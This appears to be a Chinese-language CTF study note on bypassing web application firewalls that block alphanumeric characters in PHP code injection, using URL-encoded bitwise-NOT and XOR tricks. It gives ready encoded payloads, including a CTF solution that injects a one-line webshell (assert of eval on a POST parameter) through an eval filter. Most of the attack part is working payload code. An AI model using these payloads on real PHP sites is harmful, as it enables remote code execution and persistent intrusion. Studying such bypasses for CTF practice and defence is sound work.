<https://www.cnblogs.com/Dreamerwd/p/15421284.html>

对于字符，字母，数字大小写都waf的，使用不可打印字符绕过。

## **url编码取反**
们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于有取反，url解码成不可打印字符，这样我们就会绕过。
```
<?php 
$s = 'phpinfo'; 
echo urlencode(~$s); 
?>

url:
%70%68%70%69%6e%66%6f
~:
%8F%97%8F%96%91%99%90
url解码后会变成不可打印字符乱码

?code=(~%8F%97%8F%96%91%99%90)();
?code=phpinfo();
```

## **异或绕过**
<https://blog.csdn.net/soldi_er/article/details/120052124>
<https://blog.csdn.net/weixin_40871137/article/details/107591065>
<https://blog.csdn.net/mochu7777777/article/details/104631142>
将两个字符的asci转化为二进制进行异或取值从而得到新的二进制转化为新的字符
```
phpinfo
使用异或工具
"%80%80%80%80%80%80%80"^"%f0%e8%f0%e9%ee%e6%ef"

?code=(%22%80%80%80%80%80%80%80%22^%22%f0%e8%f0%e9%ee%e6%ef%22)();
?code=phpinfo();
```

## **CTF题**
```
$code=$_GET['code'];
        if(strlen($code)>40){
                            die("This is too Long.");
                                    }
        if(preg_match("/[A-Za-z0-9]+/",$code)){
                            die("NO.");
                                    }
        @eval($code);
```
传入一句话木马
```
<?php 
error_reporting(0);
echo "外：";
$a='assert';
$b=urlencode(~$a);
echo $b;

echo "里：";
$c='(eval($_POST[test]))';
$d=urlencode(~$c);
echo $d;
 ?>
```
```
外：%9E%8C%8C%9A%8D%8B里：%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8B%9A%8C%8B%A2%D6%D6

?code=assert(eval($_POST[test]));

?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8B%9A%8C%8B%A2%D6%D6);
```